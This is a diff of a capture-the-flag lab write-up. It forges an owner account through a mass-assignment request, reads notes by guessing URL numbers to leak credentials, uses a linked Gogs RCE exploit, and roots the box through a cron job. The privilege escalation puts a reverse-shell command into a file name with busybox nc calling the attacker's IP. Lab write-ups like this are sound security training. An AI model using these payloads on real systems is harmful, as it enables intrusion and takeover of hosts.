@@ -1,4 +1,4 @@
-#Pwned
+#Pwned #Wildcards #Linux #PathTraversal #CronJobs 
 ```IP
 192.168.236.224
 ```
@@ -62,48 +62,50 @@ lServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle
 |     HTTP/1.1 400 Bad Request  
 ```
 
-# Enumeration
-
 ## HTTP
 
-create user test
-
-xss in note creation not working
-see members:
+It is possible to create a new user, so we create user test. When accessing with our new user, we see other users and among them various variables containing credentials:
 ```
 authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=
 ```
-forged_owner:forged_owner
+The credentials being: `forged_owner:forged_owner`. Now we can log in with the new credentials and create notes as shown below:
+
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014105705.png?raw=true)
 
+When created, we can see that every note has its own name, which is an iterative number. We can try to access other previously created notes by changing the URL number as shown below:
+
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014105725.png?raw=true)
 
+In the first note we get a set of credentials:
 ```
 svc-dev2022@@@!;P;4SSw0Rd
 ```
+
+With this new set of credentials we can leverage a GOGs vulnerability. This service is present in the port 8000 as shown in our nmap output. The exploit I have used is the following:
 https://github.com/Ressurect0/Gogs-RCE?tab=readme-ov-file
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014111732.png?raw=true)
 
+Once executed, we have remote access to the machine as user `jane`.
 # PrivEsc
 
-## Automated
-
 ### Peass
-```
-https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                                                                                 
-/etc/systemd/system/gogs.service is calling this writable executable: /home/jane/gogs/gogs                                                                    
-/etc/systemd/system/multi-user.target.wants/gogs.service is calling this writable executable: /home/jane/gogs/gogs                                                        
-```
+With winpeas we locate a suspicious cron job that is executing the following bash file every minute:
 
 ```
 /usr/bin/clean-tmp.sh
 ```
+This file is using the find command over /usr/shm directory and then removing all files contained in it. By creating a file named as `$(any_command)` it is possible to execute a command inside our initial command. After some trial and error I set up a listener in our kali machine an manage to execute a reverse shell creating a file with the following command:
+
+```
+echo '$(busybox nc 192.168.45.164 4444 -e sh)'
+```
 
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014120107.png?raw=true)
 
+Now we are root!
+
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241014120128.png?raw=true)
-
-
 
